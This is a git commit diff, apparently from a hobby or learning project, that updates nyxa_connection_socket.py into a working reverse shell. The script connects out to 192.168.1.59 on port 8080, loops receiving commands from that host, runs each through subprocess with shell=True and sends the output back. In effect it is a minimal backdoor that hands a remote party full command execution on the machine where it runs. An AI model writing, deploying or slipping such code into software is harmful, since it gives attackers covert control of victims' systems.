ed910348e79615281cc9608f916b74913c783b5a
Yiğit Emre Yıldırım <yldrmyigit00@gmail.com>
2026-06-30 01:10:13 -0700

    Update nyxa_connection_socket.py

--- nyxa_connection_socket.py
+++ nyxa_connection_socket.py
@@ -1,7 +1,19 @@
 import socket
+import subprocess
+
+def command_interaction(command):
+    return subprocess.check_output(command, shell=True)
+
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 connection.connect(("192.168.1.59", 8080))
 
-connection.send("connection ok")
+connection.send(b"connection ok\n")
+
+while True:
+    command = connection.recv(1024)
+    command_output = command_interaction(command)
+    connection.send(command_output)
+
+
+connection.close()
